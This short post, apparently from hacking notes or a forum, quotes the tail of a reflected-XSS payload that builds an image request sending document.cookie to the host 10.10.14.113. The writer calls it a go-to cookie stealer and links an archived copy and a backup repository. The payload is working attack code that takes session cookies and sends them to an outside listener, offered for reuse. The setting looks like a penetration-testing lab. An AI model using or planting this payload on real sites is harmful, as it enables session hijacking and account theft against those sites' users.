...
var i=new Image;
i.src="http://10.10.14.113/?"+document.cookie;
</script>
```
...
Source: [https://web.archive.org/web/20221129155804/https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md?plain=1](https://web.archive.org/web/20221129155804/https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md?plain=1)

Was my go to payload for cookie stealer, but author is nowhere to be found... 

User `tcpiplab` has backup:
[https://github.com/tcpiplab/Web-App-Hacking-Notes/blob/master/xss-reflected-steal-cookie.md](https://github.com/tcpiplab/Web-App-Hacking-Notes/blob/master/xss-reflected-steal-cookie.md)
